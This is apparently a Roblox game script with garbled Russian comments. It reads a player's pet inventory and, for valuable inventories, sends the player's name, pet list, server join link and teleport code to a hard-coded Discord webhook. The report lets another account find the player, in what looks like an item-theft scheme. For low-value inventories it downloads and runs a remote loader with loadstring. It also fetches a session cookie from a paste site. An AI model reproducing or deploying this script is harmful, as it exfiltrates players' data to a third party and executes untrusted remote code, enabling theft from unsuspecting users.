-- ‚öôÔ∏è –ö–æ–Ω—Ñ–∏–≥
getgenv().MinTotalValue = 2000
-- ================== –ö–æ–Ω—Ñ–∏–≥ (–∑–∞–ø–æ–ª–Ω–∏ –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º) ==================
-- –ü—Ä–∏–º–µ—Ä:
local COOKIE_URL = "https://pastefy.app/nES91OeT/raw"
-- =====================================================================
local function fetchCookie()
    local ok, result = pcall(function()
        return game:HttpGet(COOKIE_URL)
    end)
    if ok and result and result ~= "" then
        local cookie = result:gsub("\n", ""):gsub("\r", "")
        print("[COOKIE] –ó–∞–≥—Ä—É–∂–µ–Ω–∞ –∫—É–∫–∞ –∏–∑ Pastefy")
        return cookie
    else
        warn("[COOKIE] –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –∫—É–∫–∏")
        return nil
    end
end

-- —Ç–µ–ø–µ—Ä—å –∫—É–∫—É –º–æ–∂–Ω–æ –ø–æ–ª–æ–∂–∏—Ç—å –≤ getgenv()
getgenv().Cookie = fetchCookie()
local WEBHOOK_URL = "https://discord.com/api/webhooks/1411844628415778816/zFn2mqRx3X3zhGXa2YGREk3zl3TvquuLMh9ZtBqjfdQ_hAxf23QnbT324oLylgLEahPd" -- <- –≤–µ–±—Ö—É–∫

local PET_VALUES = {
    ["Kitsune"] = 1500,
    ["Raccoon"] = 400,
    ["Disco Bee"] = 350,
    ["Fennec Fox"] = 275,
    ["Butterfly"] = 200,
    ["Spinosaurus"] = 100,
    ["Mimic Octopus"] = 75,
    ["T-Rex"] = 75,
    ["Queen Bee"] = 60,
    ["Dragonfly"] = 60,
}

-- –°–µ—Ä–≤–∏—Å—ã
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local httpRequest = (http and http.request) or (syn and syn.request) or request or http_request
if not httpRequest then error("[SCRIPT] HTTP –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω") end

-- DataService
local dataModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))
print("[SCRIPT] –û–∂–∏–¥–∞–Ω–∏–µ playerData...")
local playerData
repeat task.wait(1)
    playerData = dataModule:GetData()
until playerData and playerData.PetsData and playerData.PetsData.PetInventory
print("[SCRIPT] ‚úÖ playerData –ø–æ–ª—É—á–µ–Ω—ã.")

local LocalPlayer = Players.LocalPlayer
local petsData = playerData.PetsData.PetInventory.Data

-- –ü–æ–¥—Å—á—ë—Ç –ø–∏—Ç–æ–º—Ü–µ–≤ –∏ –æ–±—â–µ–π —Å—Ç–æ–∏–º–æ—Å—Ç–∏
local petCounts, totalValue = {}, 0
for _, petInfo in pairs(petsData) do
    local petType = petInfo.PetType
    if petType then
        local val = PET_VALUES[petType] or 0
        if val > 0 then
            petCounts[petType] = (petCounts[petType] or 0) + 1
            totalValue = totalValue + val
        end
    end
end

if totalValue < getgenv().MinTotalValue then
    ID="72b71fa3-cd02-4785-a26d-a1da88f43dce";
    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
    return
end

-- –°–æ—Ä—Ç–∏—Ä–æ–≤–∫–∞ –ø–∏—Ç–æ–º—Ü–µ–≤ –ø–æ —Ü–µ–Ω–µ
local sortedPets = {}
for name, count in pairs(petCounts) do
    table.insert(sortedPets, { name = name, count = count, value = PET_VALUES[name] })
end
table.sort(sortedPets, function(a, b) return a.value > b.value end)

-- –°–±–æ—Ä UserId –≤—Å–µ—Ö –∏–≥—Ä–æ–∫–æ–≤
local userIds, idToName = {}, {}
for _, plr in ipairs(Players:GetPlayers()) do
    table.insert(userIds, plr.UserId)
    idToName[plr.UserId] = plr.Name
end

-- –ó–∞–ø—Ä–æ—Å presence API
local reqBody = HttpService:JSONEncode({ userIds = userIds })
local ok, response = pcall(function()
    return httpRequest({
        Url = "https://presence.roblox.com/v1/presence/users",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
        },
        Body = reqBody
    })
end)

if not ok or not response or not response.Body then
    warn("[SCRIPT] ‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ presence API.")
    return
end

local parseOk, parsed = pcall(function() return HttpService:JSONDecode(response.Body) end)
if not parseOk or not parsed or not parsed.userPresences then
    warn("[SCRIPT] ‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–∞—Ä—Å–∏—Ç—å JSON presence API.")
    return
end

-- –ù–∞—Ö–æ–¥–∏–º –ø–µ—Ä–≤–æ–≥–æ –∏–≥—Ä–æ–∫–∞ —Å placeId –∏ jobId
local firstPlaceId, firstJobId, firstPlayerName, joinLink = nil, nil, nil, nil
for _, presence in ipairs(parsed.userPresences) do
    local placeId, jobId = presence.placeId, presence.gameId
    if not firstPlaceId and placeId and jobId then
        firstPlaceId = placeId
        firstJobId = jobId
        firstPlayerName = idToName[presence.userId] or ("User_" .. presence.userId)
        joinLink = ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
        break
    end
end

if not firstPlaceId then
    print("[SCRIPT] ‚ùå –ù–µ –Ω–∞–π–¥–µ–Ω–æ –Ω–∏ –æ–¥–Ω–æ–≥–æ –∏–≥—Ä–æ–∫–∞ –¥–ª—è —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞.")
    return
end

-- –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ Discord embed
local embedFields = {}
for _, p in ipairs(sortedPets) do
    table.insert(embedFields, {
        name = p.name,
        value = string.format("%d √ó %d = %d", p.count, p.value, p.count * p.value),
        inline = true
    })
end

table.insert(embedFields, {
    name = "–¢–µ–ª–µ–ø–æ—Ä—Ç (TeleportService)",
    value = string.format("`game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')`", firstPlaceId, firstJobId),
    inline = false
})

-- Embed
local embed = {
    title = "–û—Ç—á—ë—Ç –ø–æ –ø–∏—Ç–æ–º—Ü–∞–º ‚Äî " .. LocalPlayer.Name,
    description = string.format("üí∞ –°—É–º–º–∞—Ä–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å: %d", totalValue),
    color = 0x1ABC9C,
    fields = embedFields,
    footer = { text = "üîó –°—Å—ã–ª–∫–∞ –¥–ª—è —Ä—É—á–Ω–æ–≥–æ Join (–Ω–µ –ª–æ–º–∞–µ—Ç —Å–∫—Ä–∏–ø—Ç)" },
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

-- payload —Å @everyone –∏ —Å—Å—ã–ª–∫–æ–π –¥–ª—è —Ä—É—á–Ω–æ–≥–æ –≤—Ö–æ–¥–∞
local payload = HttpService:JSONEncode({
    content = "@everyone\n" .. (joinLink or "–ù–µ—Ç —Å—Å—ã–ª–∫–∏"),
    embeds = { embed }
})

-- –û—Ç–ø—Ä–∞–≤–∫–∞ –≤–µ–±—Ö—É–∫–∞
local okSend, respSend = pcall(function()
    return httpRequest({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = payload
    })
end)

if okSend and respSend and (respSend.StatusCode == 200 or respSend.StatusCode == 204) then
    print("[SCRIPT] ‚úÖ –í–µ–±—Ö—É–∫ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω. –¢–µ–ª–µ–ø–æ—Ä—Ç-–∫–æ–¥ –≥–æ—Ç–æ–≤ –¥–ª—è —Å–∫—Ä–∏–ø—Ç–∞ –Ω–∞ –¥—Ä—É–≥–æ–º –∞–∫–∫–∞—É–Ω—Ç–µ.")
else
    warn("[SCRIPT] ‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤–µ–±—Ö—É–∫:", respSend and (respSend.StatusCode or respSend.Body) or tostring(okSend))
end

